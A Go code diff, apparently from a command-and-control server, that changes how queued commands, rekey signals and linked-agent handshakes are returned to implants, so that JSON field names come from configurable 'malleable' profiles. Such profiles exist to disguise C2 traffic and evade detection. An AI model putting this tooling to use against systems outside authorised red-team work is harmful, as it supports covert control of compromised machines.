@@ -78,12 +78,34 @@ func (m *Manager) handleGetRequest(w http.ResponseWriter, clientID string, cmdBu
 	log.Printf("[GetRequest] Attempting to get commands for clientID: %q", clientID)
 	commands, exists := cmdBuffer.GetCommand(clientID)
 
+	// Load unified link malleable configuration (shared between SMB and TCP)
+	linkMalleable, cfgErr := config.GetLinkMalleable()
+	if cfgErr != nil {
+		log.Printf("[GetRequest] Warning: Failed to load link config, using defaults: %v", cfgErr)
+	}
+
 	var responseToEncrypt map[string]interface{}
+
+	// Get malleable field names from response profile (with defaults)
+	statusField := "status"
+	dataField := "data"
+	noCommandsValue := "no_commands"
+	commandReadyValue := "command_ready"
+
+	if responseProfile != nil {
+		if responseProfile.StatusField != "" {
+			statusField = responseProfile.StatusField
+		}
+		if responseProfile.DataField != "" {
+			dataField = responseProfile.DataField
+		}
+		log.Printf("[GetRequest] Using profile field names: status=%q, data=%q", statusField, dataField)
+	}
 
 	if !exists || len(commands) == 0 {
 		log.Printf("[GetRequest] No commands found for clientID: %q", clientID)
 		responseToEncrypt = map[string]interface{}{
-			"status": "no_commands",
+			statusField: noCommandsValue,
 		}
 
 		// Even if no commands for edge agent, check for link responses
@@ -93,11 +115,11 @@ func (m *Manager) handleGetRequest(w http.ResponseWriter, clientID string, cmdBu
 		} else {
 			if len(handshakes) > 0 {
 				log.Printf("[GetRequest] Including %d handshake responses for edge agent %s", len(handshakes), clientID)
-				responseToEncrypt["lr"] = handshakes // "lr" = link responses (handshakes)
+				responseToEncrypt[linkMalleable.LinkHandshakeResponseField] = handshakes
 			}
 			if len(linkCmds) > 0 {
 				log.Printf("[GetRequest] Including %d link commands for edge agent %s", len(linkCmds), clientID)
-				responseToEncrypt["lc"] = linkCmds // "lc" = link commands
+				responseToEncrypt[linkMalleable.LinkCommandsField] = linkCmds
 			}
 		}
 	} else {
@@ -145,25 +167,29 @@ func (m *Manager) handleGetRequest(w http.ResponseWriter, clientID string, cmdBu
 				if firstCommand == "rekey" {
 					log.Printf("[GetRequest] Rekey command detected for clientID: %q", clientID)
 
-					// Load malleable config to get custom rekey command value and field names
-					malleableConfig, err := config.GetMalleableConfig()
-					if err != nil {
-						log.Printf("[GetRequest] Warning: Failed to load malleable config, using defaults: %v", err)
-					}
-
-					// Get the malleable rekey command value and field names (use defaults if config fails)
+					// Get rekey status VALUE from profile or malleable config
+					// Note: Uses the outer statusField/dataField for field NAMES (from profile)
 					rekeyStatusValue := "rekey_required"
-					statusField := "status"
-					dataField := "data"
 					idField := "command_db_id"
 
-					if malleableConfig != nil {
-						rekeyStatusValue = malleableConfig.RekeyCommand
-						statusField = malleableConfig.RekeyStatusField
-						dataField = malleableConfig.RekeyDataField
-						idField = malleableConfig.RekeyIDField
-						log.Printf("[GetRequest] Using malleable rekey - value: %q, fields: {%s, %s, %s}",
-							rekeyStatusValue, statusField, dataField, idField)
+					// First check if profile has a custom rekey value
+					if responseProfile != nil && responseProfile.RekeyValue != "" {
+						rekeyStatusValue = responseProfile.RekeyValue
+						if responseProfile.CommandIDField != "" {
+							idField = responseProfile.CommandIDField
+						}
+						log.Printf("[GetRequest] Using profile rekey value: %q, id field: %s", rekeyStatusValue, idField)
+					} else {
+						// Fall back to malleable config
+						malleableConfig, err := config.GetMalleableConfig()
+						if err != nil {
+							log.Printf("[GetRequest] Warning: Failed to load malleable config, using defaults: %v", err)
+						}
+						if malleableConfig != nil {
+							rekeyStatusValue = malleableConfig.RekeyCommand
+							idField = malleableConfig.RekeyIDField
+							log.Printf("[GetRequest] Using malleable rekey value: %q, id field: %s", rekeyStatusValue, idField)
+						}
 					}
 
 					responseToEncrypt = map[string]interface{}{
@@ -205,25 +231,25 @@ normalCommand:
 	// Log encrypted data size instead of content
 	log.Printf("[GetRequest] Encrypted command for clientID %q: %d bytes", clientID, len(encrypted))
 
-	// Prepare response for XOR encryption
+	// Prepare response for XOR encryption using profile's field names
 	responseToEncrypt = map[string]interface{}{
-		"status": "command_ready",
-		"data":   encrypted,
+		statusField: commandReadyValue,
+		dataField:   encrypted,
 	}
 
 	// Check for pending link responses (handshake responses + commands for linked agents)
-	// "lr" for handshake responses, "lc" for link commands
+	// Uses malleable field names for handshake responses and link commands
 	handshakes, linkCmds, err := m.getPendingLinkResponsesSeparate(clientID)
 	if err != nil {
 		log.Printf("[GetRequest] Warning: Failed to get link responses: %v", err)
 	} else {
 		if len(handshakes) > 0 {
 			log.Printf("[GetRequest] Including %d handshake responses for edge agent %s", len(handshakes), clientID)
-			responseToEncrypt["lr"] = handshakes // "lr" = link responses (handshakes)
+			responseToEncrypt[linkMalleable.LinkHandshakeResponseField] = handshakes
 		}
 		if len(linkCmds) > 0 {
 			log.Printf("[GetRequest] Including %d link commands for edge agent %s", len(linkCmds), clientID)
-			responseToEncrypt["lc"] = linkCmds // "lc" = link commands
+			responseToEncrypt[linkMalleable.LinkCommandsField] = linkCmds
 		}
 	}
 
